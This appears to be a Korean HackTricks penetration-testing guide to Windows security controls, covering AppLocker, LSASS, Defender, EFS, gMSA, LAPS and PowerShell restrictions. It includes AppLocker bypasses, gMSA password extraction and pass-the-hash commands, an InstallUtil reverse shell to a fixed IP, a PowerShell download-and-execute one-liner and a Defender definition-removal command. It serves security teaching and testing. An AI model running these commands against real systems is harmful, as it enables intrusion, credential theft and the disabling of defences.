# Windows 보안 제어

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 정책

애플리케이션 화이트리스트는 시스템에 설치하고 실행할 수 있도록 승인된 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 목표는 조직의 구체적인 비즈니스 요구 사항에 부합하지 않는 유해한 malware와 승인되지 않은 소프트웨어로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **애플리케이션 화이트리스트 솔루션**으로, 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어**할 수 있게 해줍니다. 실행 파일, 스크립트, Windows 설치 파일, DLL, 패키지 앱 및 패키지 앱 설치 프로그램을 **세밀하게 제어**할 수 있습니다.\
조직에서 **cmd.exe와 PowerShell.exe를 차단**하고 특정 디렉터리에 대한 쓰기 권한을 제한하는 것은 일반적이지만, **이 모든 조치는 우회할 수 있습니다**.

### 확인

차단 또는 허용 목록에 있는 파일/확장자를 확인합니다:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

이 registry path에는 AppLocker가 적용하는 구성과 정책이 포함되어 있어, 시스템에서 현재 적용 중인 규칙을 확인할 수 있습니다.

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy를 우회할 때 유용한 **쓰기 가능한 폴더**: AppLocker에서 `C:\Windows\System32` 또는 `C:\Windows` 내의 항목을 무엇이든 실행하도록 허용하는 경우, 이를 **우회하는 데** 사용할 수 있는 **쓰기 가능한 폴더**가 있습니다.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- 일반적으로 **신뢰되는** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리도 AppLocker를 우회하는 데 유용할 수 있습니다.
- **잘못 작성된 규칙도 우회할 수 있습니다.**
  - 예를 들어 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** 규칙의 경우, 어디든 **`allowed`라는 폴더를 만들면** 해당 경로가 허용됩니다.
  - 조직에서는 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단하는 데** 집중하는 경우가 많지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell 실행 파일 위치**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)를 잊곤 합니다.
- 시스템에 추가 부하를 줄 수 있고 아무것도 손상되지 않는지 확인하려면 테스트가 많이 필요하므로 **DLL enforcement는 거의 활성화되지 않습니다**. 따라서 **DLL을 backdoor로 사용하면 AppLocker를 우회하는 데 도움이 됩니다**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하면 모든 프로세스에서 **PowerShell** 코드를 **실행**하여 AppLocker를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## 자격 증명 저장소

### Security Accounts Manager (SAM)

로컬 자격 증명은 이 파일에 저장되며, 비밀번호는 해시되어 있습니다.

### Local Security Authority (LSA) - LSASS

Single Sign-On을 위해 이 하위 시스템의 **메모리**에 **자격 증명**(해시된 값)이 **저장됩니다**.\
**LSA**는 로컬 **보안 정책**(비밀번호 정책, 사용자 권한 등), **인증**, **액세스 토큰** 등을 관리합니다.\
LSA는 제공된 자격 증명을 **SAM** 파일에서 **확인**(로컬 로그인인 경우)하고, 도메인 사용자를 인증하기 위해 **도메인 컨트롤러**와 **통신**합니다.

**자격 증명**은 **LSASS 프로세스**에 **저장됩니다**: Kerberos 티켓, NT 및 LM 해시, 쉽게 복호화할 수 있는 비밀번호.

### LSA secrets

LSA는 일부 자격 증명을 디스크에 저장할 수 있습니다.

- Active Directory 컴퓨터 계정의 비밀번호(도메인 컨트롤러에 연결할 수 없는 경우)
- Windows 서비스 계정의 비밀번호
- 예약된 작업의 비밀번호
- 그 외(IIS 애플리케이션의 비밀번호 등)

### NTDS.dit

Active Directory 데이터베이스입니다. 도메인 컨트롤러에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11과 일부 Windows Server 버전에서 사용할 수 있는 Antivirus입니다. **`WinPEAS`**와 같은 일반적인 pentesting 도구를 **차단합니다**. 하지만 이러한 보호 기능을 **우회하는 방법**이 있습니다.

### 확인

Defender의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행하면 됩니다(활성화 여부를 확인하려면 **`RealTimeProtectionEnabled`** 값을 확인하세요).

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

다음 명령을 실행해도 열거할 수 있습니다.

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS는 **File Encryption Key (FEK)**라고 하는 **대칭 키**를 사용해 파일을 암호화하여 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 암호화된 파일의 $EFS **대체 데이터 스트림**에 저장됩니다. 복호화가 필요하면 사용자의 디지털 인증서에 대응하는 **개인 키**를 사용해 $EFS 스트림에서 FEK를 복호화합니다. 자세한 내용은 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자가 직접 시작하지 않아도 복호화되는 상황**은 다음과 같습니다.

- 파일이나 폴더를 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)처럼 EFS를 지원하지 않는 파일 시스템으로 이동하면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식에서는 소유자가 암호화된 파일에 **투명하게 접근**할 수 있습니다. 하지만 소유자의 비밀번호를 변경하고 로그인하는 것만으로는 파일을 복호화할 수 없습니다.

**핵심 요점**:

- EFS는 대칭 FEK를 사용하며, 이 키는 사용자의 공개 키로 암호화됩니다.
- 복호화할 때는 사용자의 개인 키로 FEK에 접근합니다.
- FAT32로 복사하거나 네트워크를 통해 전송하는 등 특정 조건에서는 자동으로 복호화됩니다.
- 소유자는 별도의 절차 없이 암호화된 파일에 접근할 수 있습니다.

### EFS 정보 확인

**사용자**가 이 **서비스를 사용했는지** 확인하려면 다음 경로가 있는지 확인합니다:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\ 명령을 사용해 파일에 **접근할 수 있는 사용자**를 확인합니다.
폴더 내에서 `cipher /e`와 `cipher /d`를 사용해 모든 파일을 **암호화**하고 **복호화**할 수도 있습니다.

### EFS 파일 복호화

#### Authority System 권한으로 실행 중인 경우

이 방법을 사용하려면 호스트에서 **피해 사용자**가 **프로세스를 실행 중**이어야 합니다. 이 조건이 충족되면 `meterpreter` 세션에서 사용자의 프로세스 토큰을 가장할 수 있습니다(`incognito`의 `impersonate_token` 사용). 또는 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 비밀번호를 알고 있는 경우

Mimikatz 문서에서는 비밀번호를 알고 있을 때 사용자의 인증서/개인 키 자료를 가져오고 EFS로 보호된 파일을 복호화하는 방법을 설명합니다.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 간소화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. "**비밀번호 만료 안 함**" 설정이 활성화된 경우가 많은 기존 서비스 계정과 달리, gMSA는 더 안전하고 관리하기 쉬운 솔루션을 제공합니다.

- **자동 비밀번호 관리**: gMSA는 도메인 또는 컴퓨터 정책에 따라 자동으로 변경되는 복잡한 240자 비밀번호를 사용합니다. 이 과정은 Microsoft의 Key Distribution Service (KDC)에서 처리하므로 비밀번호를 수동으로 업데이트할 필요가 없습니다.
- **강화된 보안**: 이러한 계정은 잠금 상태가 되지 않으며 대화형 로그인에 사용할 수 없어 보안이 강화됩니다.
- **여러 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있어 여러 서버에서 실행되는 서비스에 적합합니다.
- **예약된 작업 지원**: 관리 서비스 계정과 달리 gMSA는 예약된 작업 실행을 지원합니다.
- **간소화된 SPN 관리**: 컴퓨터의 sAMaccount 정보나 DNS 이름이 변경되면 시스템이 Service Principal Name (SPN)을 자동으로 업데이트하여 SPN 관리를 간소화합니다.

gMSA의 비밀번호는 LDAP 속성 _**msDS-ManagedPassword**_에 저장되며 Domain Controller (DC)가 30일마다 자동으로 재설정합니다. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)이라는 암호화된 데이터 블롭 형식의 이 비밀번호는 권한이 있는 관리자와 gMSA가 설치된 서버만 가져올 수 있어 안전한 환경을 보장합니다. 이 정보에 접근하려면 LDAPS와 같은 보안 연결을 사용하거나, 연결을 'Sealing & Secure'로 인증해야 합니다.

![gMSA 비밀번호를 가져오기 위해 NTLM 인증 릴레이](../../images/asd1.png)<sup>[[1]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**를 사용하면 이 비밀번호를 읽을 수 있습니다.<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**아카이브된 원본 연구에서 자세한 정보 확인**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

같은 연구에서는 릴레이된 principal에 `msDS-ManagedPassword`를 읽을 권한이 있으면 **NTLM relay attack**으로 **gMSA password**를 얻을 수 있다고 설명합니다.<sup>[[1]](#references)</sup>

### ACL chaining 악용해 gMSA 관리 password 읽기 (GenericAll -> ReadGMSAPassword)

많은 환경에서 low-privileged 사용자는 잘못 구성된 object ACL을 악용해 DC를 침해하지 않고도 gMSA secret에 접근할 수 있습니다:<sup>[[3]](#references)</sup>

- 제어할 수 있는 그룹(예: GenericAll/GenericWrite를 통해)에 gMSA에 대한 `ReadGMSAPassword` 권한이 부여되어 있습니다.
- 해당 그룹에 자신을 추가하면 LDAP를 통해 gMSA의 `msDS-ManagedPassword` blob을 읽을 권한을 얻게 되고, 이를 바탕으로 사용할 수 있는 NTLM credentials를 도출할 수 있습니다.

일반적인 절차:

1) BloodHound로 경로를 찾고 foothold principal을 Owned로 표시합니다. 다음과 같은 edge를 찾습니다.
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 자신이 제어하는 중간 그룹에 자신을 추가합니다(bloodyAD 사용 예시):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) LDAP를 통해 gMSA 관리형 암호를 읽고 NTLM hash를 도출합니다. NetExec는 `msDS-ManagedPassword` 추출과 NTLM 변환을 자동화합니다:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) NTLM hash를 사용해 gMSA로 인증합니다(평문은 필요하지 않음). 계정이 Remote Management Users 그룹에 있으면 WinRM이 바로 작동합니다:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

참고:
- `msDS-ManagedPassword`를 LDAP로 읽으려면 sealing이 필요합니다(예: LDAPS/sign+seal). 도구에서 이를 자동으로 처리합니다.
- gMSA에는 WinRM 같은 로컬 권한이 부여되는 경우가 많습니다. 그룹 멤버십(예: Remote Management Users)을 확인하여 lateral movement를 계획하세요.
- blob만 있어 NTLM을 직접 계산하면 되는 경우, MSDS-MANAGEDPASSWORD_BLOB 구조를 참조하세요.

또 다른 ACL 경로는 gMSA 객체 자체에 대한 쓰기 권한입니다. `msDS-GroupMSAMembership`는 관리 암호를 가져올 수 있는 principal을 결정하는 데 사용되는 보안 설명자입니다. 이 속성의 schema GUID는 `888eedd6-ce04-df40-b462-b8a50e41ba38`입니다. 제어하는 그룹에 이 속성에 대한 정확한 `WriteProperty` ACE가 있다면, 읽기 권한자 목록을 변경할 수 있는 경로일 수 있습니다. 이는 이미 읽기 권한자로 등록된 것과는 다릅니다. 이 경로를 사용할 수 있다고 판단하기 전에 전체 DACL, deny 및 상속된 ACE, 유효 권한을 확인하세요. 새 그룹 멤버십을 추가한 경우 암호를 읽기 전에 토큰/세션을 새로고침해야 합니다.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**는 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있으며, 로컬 Administrator 암호를 관리할 수 있게 해줍니다. 이 암호는 **무작위로 생성되고**, 고유하며 **정기적으로 변경**되고, Active Directory에 중앙 저장됩니다. 이 암호에 대한 접근은 ACL을 통해 권한이 있는 사용자로 제한됩니다. 충분한 권한이 부여되면 로컬 admin 암호를 읽을 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하는 데 필요한 여러 기능을 **제한**합니다. 예를 들어 COM 객체를 차단하고, 승인된 .NET 유형만 허용하며, XAML 기반 워크플로, PowerShell 클래스 등을 제한합니다.

### **확인**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

현재 Windows 버전에서는 이 bypass가 더 이상 작동하지 않지만, [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하려면** _**Add a Reference**_ -> _Browse_ ->_Browse_를 선택한 다음 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경해야 할 수 있습니다**.

#### 직접 우회:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하면 모든 프로세스에서 **Powershell** 코드를 **실행**하고 제한 모드를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS 실행 정책

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

더 많은 내용은 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>에서 확인할 수 있습니다.

## Security Support Provider Interface (SSPI)

사용자를 인증하는 데 사용할 수 있는 API입니다.

SSPI는 통신하는 두 컴퓨터에 적합한 인증 프로토콜을 선택하며, 사용 가능한 경우 Kerberos를 우선합니다. 이러한 프로토콜은 Windows에 DLL로 설치되는 Security Support Provider(SSP)에서 구현합니다. 협상된 provider를 양쪽 피어가 모두 지원해야 합니다.

### 주요 SSP

- **Kerberos**: 우선적으로 사용하는 프로토콜
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성을 위해 사용
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: 웹 서버 및 LDAP에서 사용하며, 암호를 MD5 hash 형식으로 전달
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 프로토콜을 협상하는 데 사용(Kerberos 또는 NTLM 중에서 선택하며, 기본값은 Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### 협상에서 여러 방법 또는 하나의 방법만 제시할 수 있습니다.

## UAC - 사용자 계정 컨트롤

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승이 필요한 작업에 대한 동의 프롬프트**를 표시하는 기능입니다.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSA를 위한 릴레이 – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: 권한 체이닝을 통해 WinRM에서 gMSA 사용](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker 및 PowerShell Constrained Language Mode 우회](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy를 우회하는 15가지 방법](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS 파일 복호화](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ms-DS-GroupMSAMembership 특성](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
